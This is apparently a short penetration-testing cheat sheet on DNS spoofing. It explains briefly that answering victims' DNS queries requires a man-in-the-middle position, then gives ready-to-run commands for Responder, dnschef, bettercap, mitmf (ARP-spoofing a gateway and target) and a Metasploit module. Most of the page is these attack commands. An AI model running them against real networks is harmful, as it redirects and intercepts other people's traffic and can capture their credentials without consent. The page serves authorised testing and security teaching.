# ⭕ DNS Spoofing



DNS is not multicast or broadcast like LLMNR, NBT-NS or mDNS. In order to answer DNS requests, attacker first need to receive them. For instance, this can be achieved with ARP spoofing or DHCPv6 spoofing. DNS spoofing is basically setting up a DNS server and answering DNS queries obtained through man-in-the-middle technique.

### Responder

```
responder --interface "eth0"
responder -I "eth0"
```

### dnschef

```
dnschef --fakeip 'Pentest_IP_Address' --interface 'Pentest_IP_Address' --port 53 --logfile dnschef.log
```

### bettercap

```
set dns.spoof.domains $DOMAIN_FQDN
set dns.spoof.all true
dns.spoof on
```

### mitmf (deprecated)

```
mitmf --arp --spoof --gateway 10.0.0.1 --target 10.0.0.56 -i wlan0 --dns
```

### metasploit

```
use post/linux/manage/dns_spoofing
```
